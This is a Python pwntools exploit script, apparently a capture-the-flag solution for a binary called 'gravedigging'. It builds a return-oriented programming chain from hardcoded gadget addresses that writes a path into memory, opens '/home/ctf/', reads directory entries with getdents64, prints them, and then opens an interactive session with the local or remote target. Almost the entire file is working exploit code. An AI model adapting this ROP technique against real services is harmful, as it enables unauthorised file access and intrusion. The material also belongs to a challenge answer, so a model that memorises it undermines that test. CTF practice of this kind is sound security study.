#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import struct

exe = context.binary = ELF('gravedigging')
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
b *0x4011CF
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

pop_rax = 0x00000000004011aa # pop rax; ret; 
pop_rdi = 0x00000000004011a0 # pop rdi; ret; 
pop_rsi = 0x00000000004011a5 # pop rsi; ret; 
pop_rdx = 0x00000000004011af # pop rdx; ret; 
syscall = 0x000000000040119a # syscall; ret; 

DT_UNKNOWN = 0
DT_FIFO = 1
DT_CHR = 2
DT_DIR = 4
DT_BLK = 6
DT_REG = 8
DT_LNK = 10
DT_SOCK = 12

DT_NAMES = {
    DT_UNKNOWN: "unknown",
    DT_FIFO: "FIFO",
    DT_CHR: "char device",
    DT_DIR: "directory",
    DT_BLK: "block device",
    DT_REG: "regular file",
    DT_LNK: "symlink",
    DT_SOCK: "socket",
}


def init():
    global io

    io = start()

def arb_write(to_where, size=8):
    payload = flat(
        [
            pop_rax,
            0x0,
            pop_rdi,
            0x0,
            pop_rsi,
            to_where,
            pop_rdx,
            size,
            syscall
        ]
    )

    return payload

def open_path(path, flags):
    payload = flat(
        [
            pop_rax,
            0x2,
            pop_rdi,
            path,
            pop_rsi,
            flags,
            syscall
        ]
    )

    return payload

def getdents64(fd, direct_struct, count):
    payload = flat(
        [
            pop_rax,
            0x4E,
            pop_rdi,
            fd,
            pop_rsi,
            direct_struct,
            pop_rdx,
            count,
            syscall
        ]
    )

    return payload

def write(addr, size):
    payload = flat(
        [
            pop_rax,
            0x1,
            pop_rdi,
            0x1,
            pop_rsi,
            addr,
            pop_rdx,
            size,
            syscall
        ]
    )

    return payload

def dir_parser(buf: bytes):
    bpos = 0
    entries = []

    while bpos < len(buf):
        try:
            d_ino, d_off, d_reclen = struct.unpack_from("=QQH", buf, bpos)
        except struct.error:
            break 

        if d_reclen == 0:
            break 

        name_start = bpos + 18
        name_end = buf.find(b'\x00', name_start, bpos + d_reclen)
        if name_end == -1:
            break 

        d_name = buf[name_start:name_end].decode(errors='ignore')
        d_type = buf[bpos + d_reclen - 1]
        d_type_str = DT_NAMES.get(d_type, f"unknown({d_type})")

        entries.append({
            "inode": d_ino,
            "offset": d_off,
            "reclen": d_reclen,
            "name": d_name,
            "type": d_type_str,
        })

        bpos += d_reclen

    return entries

def solve():

    offset = 24
    path_addr = exe.sym["__bss_start"]
    direct_struct = path_addr + 0x50
    name = b"/home/ctf/\x00"

    payload = flat({
        offset: [
            arb_write(path_addr, len(name)),
            open_path(path_addr, 0x10000),
            getdents64(3, direct_struct, 0x500),
            write(direct_struct, 0x500)
        ]   
    })

    io.sendlineafter(b"?", payload)
    io.send(name)
    io.recvuntil(b"?\n")
    data = io.recv(0x500)
    entries = dir_parser(data)
    for e in entries:
        print(f"{e['inode']:8d}  {e['type']:<12}  {e['name']}")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

